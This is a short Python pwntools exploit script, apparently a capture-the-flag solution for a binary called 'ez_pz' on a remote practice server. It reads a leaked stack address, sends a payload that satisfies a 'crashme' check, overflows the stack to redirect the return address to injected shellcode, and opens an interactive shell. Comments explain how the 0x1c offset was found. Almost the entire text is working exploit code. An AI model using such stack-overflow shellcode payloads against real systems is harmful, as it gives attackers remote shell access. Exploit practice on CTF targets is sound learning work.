from pwn import *
context.arch='i386'

# the program disabled NX(no execute),so just shellcode

# p = process('./ez_pz')
p = remote('node3.buuoj.cn',26803)

p.recvuntil('Yippie, lets crash: ')
buff_addr = int(p.recvuntil('\n',drop=True),16)
log.info('buff_addr = %#x'%buff_addr)

shellcode = asm(shellcraft.sh())
payload = 'crashme' + '\x00'
# pass the judgement 'if ( !result )''
payload += 'a'*18
# make stack overflow by memcpy to return a address
payload += p32(buff_addr-0x1c)
# this offsset 0x1c need debbug to find it,
# notice, find the function vlun's stack address which store shellcode,
# and calculate the ofsset between program leaked address and we find stack address
# why not the leaked address, because the data in stack was changed
payload += shellcode

p.recvuntil("> ")
p.sendline(payload)
sleep(1)
p.interactive()
